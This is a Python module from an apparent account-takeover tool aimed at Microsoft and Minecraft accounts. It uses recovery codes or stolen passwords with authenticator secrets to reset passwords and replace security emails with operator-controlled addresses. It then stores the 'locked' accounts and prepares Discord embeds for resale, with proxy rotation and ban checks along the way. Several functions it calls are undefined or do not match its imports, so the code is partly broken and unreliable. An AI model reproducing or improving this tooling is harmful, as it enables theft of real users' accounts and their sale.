from authsecuring.utils.login_authenticator import login_authenticator
from authsecuring.utils.login_otp import login_otp
from authsecuring.utils.cookies.get_livedata import livedata
from authsecuring.utils.cookies.safe_cookies import has_cookie
from authsecuring.utils.security.recovery import recover, verify_password_works, RecoverError
from authsecuring.utils.security.password_gen import make_ms_password
from authsecuring.utils.cookies.get_email_code import fetch_otp
from authsecuring.utils.login_pwd import login_pwd
from authsecuring.orch import romeo_secure
from authsecuring.auth.send_auth import send_auth
from authsecuring.auth.handle_redirects import handle_redirects, get_data
from authsecuring.auth.polish_host import polish_host

from authsecuring.embed_builder import build_account_embeds, build_failure_embed
from authsecuring.auth.initial_session import get_session
from authsecuring.auth.account_status import get_account_lock_reason
from authsecuring.utils.secure import lock_account
from authsecuring.filters import rejection_reason
from authsecuring.utils.proxy import (
    close_session,
    format_exception_reason,
    is_proxy_transport_error,
    run_with_proxy_retry,
)

from storage.romeo_db import RomeoDB as DBConnection
from time import time
from typing import Awaitable, Callable
import asyncio
import logging
import json
import re
import uuid

config = json.load(open("config/config.json", "r"))

# Called right after RecoverUser succeeds so the user has credentials even if
# the later OTP/polish/secure steps hang.
CredentialsNotify = Callable[[dict], Awaitable[None]]


async def _notify_credentials(on_credentials: CredentialsNotify | None, payload: dict) -> None:
    if not on_credentials:
        return
    try:
        await on_credentials(payload)
    except Exception:
        logging.exception("on_credentials notify failed for %s", payload.get("email"))


def _password_login_page_hint(page: str) -> str:
    """Short diagnostic from the password-login HTML for logs / failure reasons."""
    lower = (page or "").lower()
    if "bad user credential" in lower or "too many signin attempts" in lower:
        return "Microsoft rejected password login (bad credential or too many attempts)."
    if "interrupt/passkey" in lower or "fido" in lower:
        return "Password login hit a passkey/FIDO interrupt and never reached MSAAUTH."
    if "that password is incorrect" in lower or "account or password is incorrect" in lower:
        return "Password was rejected as incorrect during login."
    title_m = re.search(r"<title[^>]*>(.*?)</title>", page or "", re.I | re.DOTALL)
    title = re.sub(r"\s+", " ", title_m.group(1)).strip()[:80] if title_m else "unknown"
    return f"Password login page did not yield MSAAUTH (title={title!r})."


async def _secure_after_password_login(
    sesja,
    email: str,
    password: str,
    rextra: dict,
    *,
    elapsed: float = 0.0,
) -> dict:
    """Finish securing using the new password (no OTP).

    Used as fallback when security-email OTP does not arrive after RecoverUser.
    On MSAAUTH failure returns failed=True (no further OTP retry from here).
    """
    live = await livedata(sesja)
    page = await login_pwd(sesja, email, live["urlPost"], password, live["ppft"])
    logging.info(
        "password path login_pwd for %s: len=%s snippet=%r",
        email,
        len(page or ""),
        (page or "")[:500],
    )

    msaauth = get_data(page)
    if not msaauth:
        handled = await handle_redirects(sesja, page)
        if handled == "Family":
            return _failure_result(
                email,
                "Account is Family Locked.",
                sec_mail=rextra.get("security_email"),
                password=password,
                rec_code=rextra.get("rec_code"),
            )
        if isinstance(handled, dict) and handled.get("urlPost"):
            msaauth = handled
        elif isinstance(handled, str):
            logging.info(
                "password path after handle_redirects for %s: len=%s snippet=%r",
                email,
                len(handled),
                handled[:500],
            )
            msaauth = get_data(handled)

    if not msaauth or not msaauth.get("urlPost"):
        # Session cookie alone can be enough after password verify — cookies-only polish
        if (
            has_cookie(sesja, "__Host-MSAAUTH")
            or has_cookie(sesja, "__Host-MSAAUTHP")
            or has_cookie(sesja, "MSPAuth")
        ):
            logging.warning(
                "password path has MSAAUTH cookies but no urlPost for %s — cookies-only polish",
                email,
            )
            msaauth = {"_cookies_only": True}
        else:
            hint = _password_login_page_hint(page)
            logging.error(
                "password path MSAAUTH missing for %s — %s cookies=%s",
                email,
                hint,
                [c.name for c in sesja.cookies.jar][:30],
            )
            return _failure_result(
                email,
                # Keep the historical reason string; fallback_otp drives retry.
                "Password login did not establish an MSAAUTH sesja.",
                sec_mail=rextra.get("security_email"),
                password=password,
                rec_code=rextra.get("rec_code"),
                error=hint,
                fallback_otp=True,
            )

    if msaauth.get("_cookies_only"):
        print("[+] - Got MSAAUTH (password path, cookies-only)")
    else:
        print("[+] - Got MSAAUTH (password path)")
    try:
        await polish_host(sesja, msaauth)
    except Exception:
        logging.exception("polish_host failed on password path")
        print("[!] - polish_host raised; continuing with existing cookies")
    print("[~] - Polished MSAAUTH")

    acct = {
        "microsoft": {
            "email": email,
            "sec_mail": rextra.get("security_email", "Couldn't Change!"),
            "password": password,
            "rec_code": rextra.get("rec_code", "Couldn't Change!"),
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {"active": [], "canceled": [], "commercial": []},
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False,
        },
    }

    secured = await secure(
        sesja=sesja,
        recovery=False,
        acct=acct,
        command=True,
    )

    reject = rejection_reason(secured)
    if reject:
        print(f"[X] - Rejected account: {reject}")
        logging.warning("Rejected secured account %s: %s", email, reject)
        secured_ms = (secured or {}).get("microsoft") or {}
        # Prefer post-secure secrets (authoritative) over pre-secure rextra
        return _failure_result(
            email,
            reject,
            sec_mail=(
                secured_ms.get("security_email")
                or rextra.get("security_email")
            ),
            password=secured_ms.get("password") or password,
            rec_code=(
                secured_ms.get("rec_code")
                or rextra.get("rec_code")
            ),
            creds_moved=True,
            primary_email=secured_ms.get("email") or email,
        )

    from authsecuring.banwatch import apply_ban_checks

    ban_reject = await run_ban_sweep(secured)
    if ban_reject:
        print(f"[X] - Banned account: {ban_reject}")
        logging.warning("Ban-check rejected %s: %s", email, ban_reject)
        secured_ms = (secured or {}).get("microsoft") or {}
        return _failure_result(
            email,
            ban_reject,
            sec_mail=(
                secured_ms.get("security_email")
                or rextra.get("security_email")
            ),
            password=secured_ms.get("password") or password,
            rec_code=(
                secured_ms.get("rec_code")
                or rextra.get("rec_code")
            ),
            creds_moved=True,
            primary_email=secured_ms.get("email") or email,
        )

    account_id = uuid.uuid4().hex
    with DBConnection() as db:
        db.store_locked(account_id, secured)

    return await build_account_embeds(secured, elapsed, account_id)


def _failure_result(
    email: str,
    reason: str,
    *,
    sec_mail: str | None = None,
    password: str | None = None,
    rec_code: str | None = None,
    error: str | None = None,
    fallback_otp: bool = False,
    fallback_password: bool = False,
    creds_moved: bool = False,
    primary_email: str | None = None,
    alias_swapped: bool | None = None,
) -> dict:
    # Only surface generated password/security email when RecoverUser actually succeeded
    # (or a later step failed after password change). Otherwise they mislead sellers.
    # On give-back after primary replace, pass primary_email so sellers get sunny@.
    original = (email or "").strip()
    current_primary = (primary_email or "").strip() or original
    replaced = alias_swapped
    if replaced is None:
        replaced = bool(
            current_primary
            and original
            and current_primary.lower() != original.lower()
        )
    if creds_moved:
        ms = {
            "email": current_primary,
            "sec_mail": sec_mail or "Couldn't Change!",
            "password": password or "Couldn't Change!",
            "rec_code": rec_code or "Couldn't Change!",
            "orig_email": original,
            "alias_swapped": replaced,
        }
    else:
        ms = {
            "email": current_primary,
            "sec_mail": "Couldn't Change!",
            "password": "Couldn't Change!",
            "rec_code": rec_code or "Couldn't Change!",
            "orig_email": original,
            "alias_swapped": replaced,
        }
    detail = error or reason
    # Failure = account returned: include new primary when already changed.
    # Success seller embeds still hide sunny (build_account_embeds).
    fail_embed = build_failure_embed(
        email,
        ms,
        reason,
        error=detail,
        creds_moved=creds_moved,
    )
    return {
        "failed": True,
        "reason": reason,
        "error": detail,
        "fallback_otp": fallback_otp,
        "fallback_password": fallback_password,
        "creds_moved": creds_moved,
        "microsoft": ms,
        "hit_eb": fail_embed,
        "sell_eb": fail_embed,
    }


def _flowtoken_from_auth(info: dict) -> tuple[str | None, str | None]:
    if not info:
        return None, "Microsoft login check returned no response."

    if info.get("type") == "authenticator":
        return None, "Account requires Microsoft Authenticator — email OTP is not available for this login step."

    response = info.get("response") if isinstance(info.get("response"), dict) else info
    credentials = response.get("Credentials", {}) if isinstance(response, dict) else {}
    proofs = credentials.get("OtcLoginEligibleProofs")

    if not proofs:
        auth_type = info.get("type", "unknown")
        return None, f"No email OTP method available after recovery (auth type: {auth_type})."

    return proofs[0]["data"], None


async def romeo_recover(
    email: str,
    method: str,
    data: dict,
    on_credentials: CredentialsNotify | None = None,
) -> dict:

    sesja = open_session()

    account = {
        "microsoft": {
            "email": email,
            "sec_mail": "Couldn't Change!",
            "password": "Couldn't Change!",
            "rec_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {
                "active": [], 
                "canceled": [], 
                "commercial": []
            },
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }
    
    initialTime = time()
    print("[~] - Logging in sesja...")

    match method:
        case "rcode":
            lock_reason = await get_account_lock_reason(email)
            if lock_reason:
                return _failure_result(
                    email,
                    f"Cannot secure: {lock_reason}",
                    error=lock_reason,
                )
            sname = uuid.uuid4().hex[:16]
            # Letters+digits, mixed case — no symbols
            password = make_ms_password(14)
            sec_mail = f"{sname}@{config['domain']}"
            print(f"[+] - [+] sec email ({sec_mail})")

            with DBConnection() as database:
                database.add_security_email(sec_mail, password)

            new_recovery_code = None
            try:
                # Proxy TLS flakes (ConnectError) — retry; after 2 fails mint a new sticky SSID.
                try:
                    new_recovery_code, sesja = await run_with_proxy_retry(
                        sesja,
                        lambda s: recover(
                            sesja=s,
                            email=email,
                            rec_code=data["rec_code"],
                            new_email=sec_mail,
                            new_password=password,
                        ),
                        new_session=get_session,
                        attempts=4,
                        rotate_ssid_after=2,
                        label="recover",
                        email=email,
                    )
                except RecoverError as exc:
                    return _failure_result(
                        email,
                        exc.reason,
                        sec_mail=sec_mail if exc.creds_moved else None,
                        password=password if exc.creds_moved else None,
                        rec_code=data.get("rec_code"),
                        error=exc.reason,
                        creds_moved=exc.creds_moved,
                    )
                except Exception as exc:
                    if is_network_glitch(exc):
                        return _failure_result(
                            email,
                            f"Network error during recovery ({exc.__class__.__name__}). Retry the account.",
                            rec_code=data.get("rec_code"),
                            error=str(exc) or exc.__class__.__name__,
                            creds_moved=False,
                        )
                    raise

                if not new_recovery_code or new_recovery_code == "invalid":
                    return _failure_result(
                        email,
                        "Recovery failed — Microsoft did not return a new recovery code.",
                        rec_code=data.get("rec_code"),
                        error="recover() returned empty/invalid",
                        creds_moved=False,
                    )

                print("[+] - Changed password and recovery code")
                print(f"[+] - New recovery code: {new_recovery_code}")
                print(f"[+] - Security email: {sec_mail}")
                print(f"[+] - Password: {password}")

                # DM / notify credentials IMMEDIATELY — polish/OTP can hang later
                # and previously left users with no Discord output after RecoverUser.
                await _notify_credentials(
                    on_credentials,
                    {
                        "email": email,
                        "sec_mail": sec_mail,
                        "password": password,
                        "rec_code": new_recovery_code,
                    },
                )

                # Drop the recovery jar — account.live.com + login.live.com leave
                # duplicate MSCC cookies that crash httpx. Fresh sesja for OTP login.
                await close_http(sesja)
                sesja = open_session()

                # Soft verify only — never abort recovery on flaky check.
                try:
                    pwd_status = await verify_password_works(sesja, email, password)
                except Exception as exc:
                    if is_network_glitch(exc):
                        logging.warning(
                            "Password verify proxy error for %s — rotating SSID and retrying once",
                            email,
                        )
                        await close_http(sesja)
                        sesja = open_session()
                        try:
                            pwd_status = await verify_password_works(sesja, email, password)
                        except Exception:
                            logging.exception("Password verify raised for %s", email)
                            pwd_status = "unknown"
                    else:
                        logging.exception("Password verify raised for %s", email)
                        pwd_status = "unknown"

                if pwd_status == "ok":
                    print("[+] - Password verified OK")
                elif pwd_status == "bad":
                    # RecoverUser often rotates RC while ignoring password.
                    # Fix immediately via security-email OTC → ResetPassword
                    # (passwordchange.har) — does not burn the new recovery code.
                    print(
                        "[!] - Password did NOT stick after RecoverUser — "
                        "trying security-email OTP ResetPassword"
                    )
                    logging.error(
                        "Password not applied for %s after RecoverUser — "
                        "trying OTP ResetPassword",
                        email,
                    )
                    try:
                        from authsecuring.utils.security.force_password import (
                            force_password_via_otp,
                        )

                        forced_pwd, forced_ok = await force_password_via_otp(
                            email=email,
                            sec_mail=sec_mail,
                            preferred_password=password,
                            sesja=sesja,
                        )
                        if forced_ok:
                            password = forced_pwd
                            pwd_status = "ok"
                            print("[+] - Password stuck via OTP ResetPassword")
                        else:
                            password = f"{forced_pwd} (UNVERIFIED — may not work)"
                            print(
                                "[!] - OTP ResetPassword did not verify — "
                                "will retry after login via ensure_password_verified"
                            )
                    except Exception:
                        logging.exception(
                            "OTP ResetPassword force failed for %s", email
                        )
                        password = f"{password} (UNVERIFIED — may not work)"
                else:
                    # Inconclusive (rate-limit) — one longer settle before continuing.
                    # Do NOT mark UNVERIFIED; post-login ensure_password_verified
                    # will force if login later proves the password is bad.
                    print("[~] - Password verify inconclusive — delayed re-check…")
                    try:
                        pwd_status2 = await verify_password_works(
                            sesja, email, password, settle_delay=10.0
                        )
                    except Exception:
                        pwd_status2 = "unknown"
                    if pwd_status2 == "ok":
                        pwd_status = "ok"
                        print("[+] - Password verified OK on delayed re-check")
                    elif pwd_status2 == "bad":
                        print(
                            "[!] - Delayed re-check BAD — "
                            "trying security-email OTP ResetPassword"
                        )
                        try:
                            from authsecuring.utils.security.force_password import (
                                force_password_via_otp,
                            )

                            forced_pwd, forced_ok = await force_password_via_otp(
                                email=email,
                                sec_mail=sec_mail,
                                preferred_password=password,
                                sesja=sesja,
                            )
                            if forced_ok:
                                password = forced_pwd
                                pwd_status = "ok"
                            else:
                                password = f"{forced_pwd} (UNVERIFIED — may not work)"
                                pwd_status = "bad"
                        except Exception:
                            password = f"{password} (UNVERIFIED — may not work)"
                            pwd_status = "bad"
                    else:
                        print("[~] - Password verify still inconclusive (continuing)")

                rextra = {
                    "sec_mail": sec_mail,
                    "password": password,
                    "rec_code": new_recovery_code,
                }

                # OTP-first after RecoverUser. Password login right after recover
                # often triggers MS "unusual sign-in" / confirm interrupts that
                # poison later SA elevation; security-email OTP usually does not.
                # Password is the fallback when OTP mail does not arrive (30s).
                account = None
                from authsecuring.utils.security.force_password import clean_password

                login_password = clean_password(password)

                async def _otp_login(s):
                    import time as _time

                    # Initial OTP request + resends if mail is slow.
                    # RecoverUser traffic often delays security-email delivery —
                    # give it more time before falling back to password.
                    max_otp_rounds = 3
                    otp_timeout_s = 60
                    code = None
                    flowtoken = None
                    last_auth_error = None

                    for round_i in range(1, max_otp_rounds + 1):
                        info = await send_auth(s, email, sec_mail)
                        flowtoken, auth_error = _flowtoken_from_auth(info)
                        if auth_error:
                            last_auth_error = auth_error
                            # Authenticator / no email proof — don't burn OTP waits
                            return _failure_result(
                                email,
                                auth_error,
                                sec_mail=sec_mail,
                                password=password,
                                rec_code=new_recovery_code,
                                creds_moved=True,
                            )

                        since = _time.time()
                        print(
                            f"[~] - Getting email code (OTP round {round_i}/"
                            f"{max_otp_rounds}, {otp_timeout_s}s)..."
                        )
                        code = await fetch_otp(
                            sec_mail, timeout=otp_timeout_s, since=since
                        )
                        print(f"Got code - {code}")
                        if code:
                            break
                        if round_i < max_otp_rounds:
                            print(
                                f"[!] - OTP not received in {otp_timeout_s}s — "
                                "requesting another code..."
                            )

                    if not code:
                        return _failure_result(
                            email,
                            last_auth_error
                            or (
                                f"Timed out waiting for OTP after {max_otp_rounds} "
                                "sends at the new security email."
                            ),
                            sec_mail=sec_mail,
                            password=password,
                            rec_code=new_recovery_code,
                            creds_moved=True,
                            fallback_password=True,
                        )

                    live = await livedata(s)
                    ppft = live["ppft"]

                    return await romeo_secure(
                        sesja=s,
                        email=email,
                        device=flowtoken,
                        ppft=ppft,
                        code=code,
                        recovery=False,
                        rextra=rextra,
                        command=True,
                    )

                print("[~] - Logging in via security-email OTP (password is fallback)...")
                await close_http(sesja)
                sesja = open_session()

                try:
                    account, sesja = await run_with_proxy_retry(
                        sesja,
                        _otp_login,
                        new_session=get_session,
                        attempts=4,
                        rotate_ssid_after=2,
                        label="otp-login",
                        email=email,
                    )
                except Exception as exc:
                    if is_network_glitch(exc):
                        logging.warning(
                            "otp path proxy exhausted for %s — falling back to password",
                            email,
                        )
                        account = _failure_result(
                            email,
                            f"Network error during OTP login ({exc.__class__.__name__}).",
                            sec_mail=sec_mail,
                            password=password,
                            rec_code=new_recovery_code,
                            error=str(exc) or exc.__class__.__name__,
                            creds_moved=True,
                            fallback_password=True,
                        )
                        await close_http(sesja)
                        sesja = open_session()
                    else:
                        raise

                if (
                    isinstance(account, dict)
                    and account.get("failed")
                    and account.get("fallback_password")
                    and login_password
                ):
                    # Skip password fallback when verify already proved BAD —
                    # that only burns attempts and yields "no MSAAUTH".
                    if pwd_status == "bad" or "UNVERIFIED" in str(password):
                        logging.warning(
                            "OTP failed for %s and password is UNVERIFIED/bad — "
                            "trying one RecoverUser password force before give-back",
                            email,
                        )
                        print(
                            "[!] - Security-email OTP failed; password verify was "
                            f"{pwd_status} — forcing RecoverUser password retry…"
                        )
                        try:
                            from authsecuring.utils.security.force_password import (
                                force_password_after_recover,
                                strip_unverified,
                            )

                            forced_pwd, forced_rc, forced_ok = await force_password_after_recover(
                                sesja,
                                email=email,
                                sec_mail=sec_mail,
                                rec_code=new_recovery_code,
                                preferred_password=clean_password(password),
                                max_attempts=3,
                            )
                            if forced_rc:
                                new_recovery_code = forced_rc
                            if forced_pwd:
                                password = forced_pwd
                            if forced_ok:
                                print(
                                    "[+] - Forced password stuck after OTP failure — "
                                    "retrying password login"
                                )
                                await close_http(sesja)
                                sesja = open_session()

                                async def _pwd_login_after_force(s):
                                    return await _secure_after_password_login(
                                        s,
                                        email,
                                        forced_pwd,
                                        {
                                            "sec_mail": sec_mail,
                                            "password": forced_pwd,
                                            "rec_code": new_recovery_code,
                                        },
                                        elapsed=time() - initialTime,
                                    )

                                try:
                                    account, sesja = await run_with_proxy_retry(
                                        sesja,
                                        _pwd_login_after_force,
                                        new_session=get_session,
                                        attempts=4,
                                        rotate_ssid_after=2,
                                        label="password-login-after-force",
                                        email=email,
                                    )
                                    if isinstance(account, dict):
                                        # Success or reject-with-creds — keep as-is
                                        return account
                                except Exception as force_login_exc:
                                    logging.warning(
                                        "password login after force failed for %s: %s",
                                        email,
                                        force_login_exc,
                                    )
                            else:
                                password = f"{clean_password(password)} (UNVERIFIED — may not work)"
                        except Exception as force_exc:
                            logging.exception(
                                "force_password_after_recover failed for %s", email
                            )
                            print(
                                f"[X] - Force password retry failed "
                                f"({force_exc.__class__.__name__})"
                            )

                        return _failure_result(
                            email,
                            "Security-email OTP did not arrive and password did not "
                            "stick after RecoverUser. Use the recovery code below "
                            "to sign in / reset, then resubmit if needed.",
                            sec_mail=sec_mail,
                            password=password,
                            rec_code=new_recovery_code,
                            creds_moved=True,
                        )

                    logging.warning(
                        "OTP path failed for %s (%s) — falling back to password login"
                        " (pwd_status=%s)",
                        email,
                        account.get("error") or account.get("reason"),
                        pwd_status,
                    )
                    print(
                        "[!] - Security-email OTP failed after resend; "
                        f"falling back to password login (verify={pwd_status})..."
                    )
                    await close_http(sesja)
                    sesja = open_session()

                    async def _pwd_login(s):
                        return await _secure_after_password_login(
                            s,
                            email,
                            login_password,
                            {**rextra, "password": login_password},
                            elapsed=time() - initialTime,
                        )

                    try:
                        account, sesja = await run_with_proxy_retry(
                            sesja,
                            _pwd_login,
                            new_session=get_session,
                            attempts=4,
                            rotate_ssid_after=2,
                            label="password-login",
                            email=email,
                        )
                    except Exception as exc:
                        if is_network_glitch(exc):
                            return _failure_result(
                                email,
                                f"Network error during password login "
                                f"({exc.__class__.__name__}). "
                                "Credentials above are valid — retry securing.",
                                sec_mail=sec_mail,
                                password=password,
                                rec_code=new_recovery_code,
                                error=str(exc) or exc.__class__.__name__,
                                creds_moved=True,
                            )
                        raise

                if isinstance(account, dict) and account.get("failed"):
                    # Keep reject embeds from romeo_secure (include sunny@ primary).
                    # Re-wrapping via _failure_result without primary_email was wiping it.
                    if account.get("hit_eb") or account.get("sell_eb"):
                        ms = account.get("microsoft") or {}
                        if not ms.get("security_email") and sec_mail:
                            ms["security_email"] = sec_mail
                        if not ms.get("password") and password:
                            ms["password"] = password
                        if not ms.get("rec_code") and new_recovery_code:
                            ms["rec_code"] = new_recovery_code
                        account["microsoft"] = ms
                        account["creds_moved"] = True
                        return account
                    ms = account.get("microsoft") or {}
                    return _failure_result(
                        email,
                        account.get(
                            "reason",
                            "Login or securing failed after recovery code reset.",
                        ),
                        sec_mail=ms.get("security_email") or sec_mail,
                        password=ms.get("password") or password,
                        rec_code=ms.get("rec_code") or new_recovery_code,
                        error=account.get("error") or account.get("reason"),
                        creds_moved=True,
                        primary_email=ms.get("email"),
                    )

                if not account:
                    return _failure_result(
                        email,
                        "Login or securing failed after recovery code reset.",
                        sec_mail=sec_mail,
                        password=password,
                        rec_code=new_recovery_code,
                        error="romeo_secure returned no account data.",
                        creds_moved=True,
                    )

                return account
            except Exception as exc:
                logging.exception("recovery_secure rcode failed for %s", email)
                if new_recovery_code:
                    # Surface a readable reason — never dump bare AttributeError.group
                    # (httpx ReadTimeout often has empty str(exc) → blank Discord text)
                    reason = proxy_error_reason(exc)
                    where = ""
                    try:
                        import traceback as _tb
                        frames = _tb.extract_tb(exc.__traceback__)
                        if frames:
                            fr = frames[-1]
                            where = f" ({fr.filename.rsplit('/', 1)[-1]}:{fr.lineno})"
                    except Exception:
                        pass
                    if is_network_glitch(exc):
                        reason = (
                            f"Network/proxy error ({reason}). "
                            "Credentials above are valid — retry securing."
                        )
                    elif "has no attribute 'group'" in reason:
                        reason = (
                            f"Parser missed a field{where}. "
                            "Recovery already completed — credentials above are valid; retry securing."
                        )
                    else:
                        reason = f"{reason}{where}"
                    return _failure_result(
                        email,
                        f"Securing step failed: {reason}",
                        sec_mail=sec_mail,
                        password=password,
                        rec_code=new_recovery_code,
                        error=reason,
                        creds_moved=True,
                    )
                raise
            finally:
                await close_http(sesja)
            
        case "authpwd":
            # Password + authenticator TOTP login, then secure(recovery=True)
            # which mints RC → RecoverUser (new pwd / security email).
            # Parity with rcode: proxy retry, filters, ban checks, give-back, sesja close.
            lock_reason = await get_account_lock_reason(email)
            if lock_reason:
                return _failure_result(
                    email,
                    f"Cannot secure: {lock_reason}",
                    error=lock_reason,
                )

            seller_password = (data.get("password") or "").strip()
            auth_secret = (data.get("auth_secret") or "").strip()
            if not seller_password or not auth_secret:
                return _failure_result(
                    email,
                    "Missing password or authenticator secret",
                    error="missing authpwd fields",
                )

            try:
                async def _totp_login(s):
                    result = await login_authenticator(
                        sesja=s,
                        email=email,
                        data={"password": seller_password, "auth_secret": auth_secret},
                    )
                    if result is not True:
                        reason = (
                            result
                            if isinstance(result, str) and result
                            else "invalid credentials"
                        )
                        return _failure_result(
                            email,
                            reason if reason != "invalid" else "invalid credentials",
                            password=seller_password,
                            error=reason,
                        )
                    return True

                login_ok, sesja = await run_with_proxy_retry(
                    sesja,
                    _totp_login,
                    new_session=get_session,
                    attempts=4,
                    rotate_ssid_after=2,
                    label="authpwd-login",
                    email=email,
                )
                if isinstance(login_ok, dict) and login_ok.get("failed"):
                    return login_ok

                print("[~] - Authenticator login OK — securing account…")
                # Seed seller credentials so proofs MFA (i5600) can try password
                # before recovery code / security email exist.
                account["microsoft"]["password"] = seller_password
                account["microsoft"]["auth_secret"] = auth_secret

                # Re-secure of an already-hit account: seed prior RC / security
                # email from DB. MS often blocks GetOneTimeCode on i5600 (203/204);
                # having recovery lets secure() soft-skip proofs and still RecoverUser.
                try:
                    with DBConnection() as database:
                        prior = database.get_secured_account_by_email(email)
                    if prior:
                        ms = account["microsoft"]
                        prior_rc = str(prior.get("rec_code") or "").strip()
                        prior_sec = str(prior.get("security_email") or "").strip()
                        prior_pwd = str(prior.get("password") or "").strip()
                        if prior_rc and prior_rc not in (
                            "Couldn't Change!",
                            "Failed to generate",
                        ):
                            ms["rec_code"] = prior_rc
                            print(
                                f"[~] - Seeded prior recovery code from DB "
                                f"({prior_rc[:8]}…)"
                            )
                        if prior_sec and "@" in prior_sec and prior_sec != "Couldn't Change!":
                            ms["security_email"] = prior_sec
                            print(f"[~] - Seeded prior security email from DB ({prior_sec})")
                        # Seller TOTP password may be stale after a prior RecoverUser —
                        # keep seller_password for login, but stash secured pwd for MFA.
                        if prior_pwd and prior_pwd not in ("Couldn't Change!", "Unknown"):
                            ms["secured_password"] = prior_pwd
                except Exception:
                    logging.exception(
                        "authpwd: failed seeding prior secured creds for %s", email
                    )

                # Login already has proxy retry; secure() used to run once and soft-fail
                # on the first ConnectError (Bamboozled sunny906 resubmit). Retry on the
                # same sesja, then re-login on a fresh sticky SSID and try again.
                dsecured = None
                last_secure_exc: BaseException | None = None
                secure_attempts = 4
                for secure_try in range(1, secure_attempts + 1):
                    try:
                        if secure_try > 1:
                            print(
                                f"[!] - authpwd secure() retry {secure_try}/{secure_attempts}"
                                " — fresh sticky + re-login…"
                            )
                            await close_http(sesja)
                            sesja = open_session()
                            login_ok, sesja = await run_with_proxy_retry(
                                sesja,
                                _totp_login,
                                new_session=get_session,
                                attempts=4,
                                rotate_ssid_after=2,
                                label="authpwd-relogin",
                                email=email,
                            )
                            if isinstance(login_ok, dict) and login_ok.get("failed"):
                                return login_ok
                        dsecured = await secure(
                            sesja=sesja,
                            recovery=True,
                            acct=account,
                            command=True,
                        )
                        last_secure_exc = None
                        break
                    except Exception as exc:
                        last_secure_exc = exc
                        if (
                            is_network_glitch(exc)
                            and secure_try < secure_attempts
                        ):
                            logging.warning(
                                "authpwd secure() %s for %s (attempt %s/%s) — retrying",
                                exc.__class__.__name__,
                                email,
                                secure_try,
                                secure_attempts,
                            )
                            print(
                                f"[!] - authpwd secure() {exc.__class__.__name__} "
                                f"({secure_try}/{secure_attempts}) — retrying…"
                            )
                            await asyncio.sleep(1.5 * secure_try)
                            continue
                        break

                if last_secure_exc is not None:
                    exc = last_secure_exc
                    logging.exception("authpwd secure() crashed for %s", email)
                    ms = (account.get("microsoft") or {})
                    primary = str(ms.get("email") or "").strip() or email
                    replaced = ms.get("alias_swapped") is True or (
                        primary.lower() != email.lower()
                    )
                    creds_changed = (
                        bool(
                            ms.get("rec_code")
                            and ms.get("rec_code")
                            not in ("Couldn't Change!", "Failed to generate", None)
                        )
                        or bool(
                            ms.get("security_email")
                            and ms.get("security_email") not in ("Couldn't Change!", None)
                        )
                        or replaced
                    )
                    reason = proxy_error_reason(exc)
                    if is_network_glitch(exc):
                        reason = (
                            f"Network/proxy error ({reason}). "
                            "Retry securing — credentials may already have changed."
                        )
                    return _failure_result(
                        email,
                        f"Securing step failed: {reason}",
                        sec_mail=ms.get("security_email") if creds_changed else None,
                        password=ms.get("password") if creds_changed else seller_password,
                        rec_code=ms.get("rec_code") if creds_changed else None,
                        error=reason,
                        creds_moved=creds_changed,
                        primary_email=primary,
                        alias_swapped=replaced,
                    )

                if not dsecured or not isinstance(dsecured, dict):
                    ms = (account.get("microsoft") or {})
                    primary = str(ms.get("email") or "").strip() or email
                    replaced = ms.get("alias_swapped") is True
                    return _failure_result(
                        email,
                        "Login or securing failed after authenticator login.",
                        password=seller_password,
                        error="secure() returned no account data",
                        primary_email=primary,
                        alias_swapped=replaced,
                        creds_moved=replaced,
                    )

                ms = dsecured.get("microsoft") or {}
                new_rc = str(ms.get("rec_code") or "").strip()
                new_sec = str(ms.get("security_email") or "").strip()
                new_pwd = str(ms.get("password") or "").strip()
                creds_ready = (
                    new_rc
                    and new_rc not in ("Couldn't Change!", "Failed to generate", "invalid")
                    and new_sec
                    and new_sec not in ("Couldn't Change!", "Unknown")
                )
                if creds_ready:
                    await _notify_credentials(
                        on_credentials,
                        {
                            "email": email,
                            "sec_mail": new_sec,
                            "password": new_pwd,
                            "rec_code": new_rc,
                        },
                    )

                reject = rejection_reason(dsecured)
                if reject:
                    print(f"[X] - Rejected account: {reject}")
                    logging.warning("Rejected authpwd account %s: %s", email, reject)
                    return _failure_result(
                        email,
                        reject,
                        sec_mail=ms.get("security_email"),
                        password=ms.get("password") or seller_password,
                        rec_code=ms.get("rec_code"),
                        creds_moved=True,
                        primary_email=ms.get("email") or email,
                    )

                from authsecuring.banwatch import apply_ban_checks

                ban_reject = await run_ban_sweep(dsecured)
                if ban_reject:
                    print(f"[X] - Banned account: {ban_reject}")
                    logging.warning("Ban-check rejected authpwd %s: %s", email, ban_reject)
                    return _failure_result(
                        email,
                        ban_reject,
                        sec_mail=ms.get("security_email"),
                        password=ms.get("password") or seller_password,
                        rec_code=ms.get("rec_code"),
                        creds_moved=True,
                        primary_email=ms.get("email") or email,
                    )

                if not creds_ready:
                    primary = str(ms.get("email") or "").strip() or email
                    replaced = ms.get("alias_swapped") is True or (
                        primary.lower() != email.lower()
                    )
                    return _failure_result(
                        email,
                        "Securing failed — recovery code / security email were not set.",
                        password=ms.get("password") or seller_password,
                        rec_code=ms.get("rec_code"),
                        sec_mail=ms.get("security_email"),
                        error="authpwd secure did not produce new credentials",
                        creds_moved=replaced,
                        primary_email=primary,
                        alias_swapped=replaced,
                    )

                final_time = time() - initialTime
                account_id = uuid.uuid4().hex
                with DBConnection() as database:
                    database.store_locked(account_id, dsecured)
                return await build_account_embeds(dsecured, final_time, account_id)
            except Exception as exc:
                logging.exception("recovery_secure authpwd failed for %s", email)
                if is_network_glitch(exc):
                    return _failure_result(
                        email,
                        f"Network error during authenticator secure ({exc.__class__.__name__}). Retry.",
                        password=seller_password,
                        error=str(exc) or exc.__class__.__name__,
                    )
                raise
